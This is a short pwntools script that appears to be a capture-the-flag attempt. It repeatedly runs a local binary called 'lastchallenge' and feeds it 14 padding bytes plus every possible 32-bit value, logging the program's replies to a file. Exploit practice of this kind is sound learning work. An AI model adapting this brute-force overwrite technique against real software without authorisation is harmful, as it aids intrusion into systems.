from pwn import *

f = open("out.txt", "a")
for i in range (4294967295):
  r = process('./lastchallenge')
  r.sendline(b'.'*14 + p32(i))

  data = r.recvline(timeout=1)
  f.write(data.decode())

  data = r.recvline(timeout=1)
  f.write(data.decode())

  data = r.recvline(timeout=1)
  f.write(data.decode())

  data = r.recvline(timeout=1)
  f.write(data.decode())
  r.close()

f.close()

#gdb.attach(r)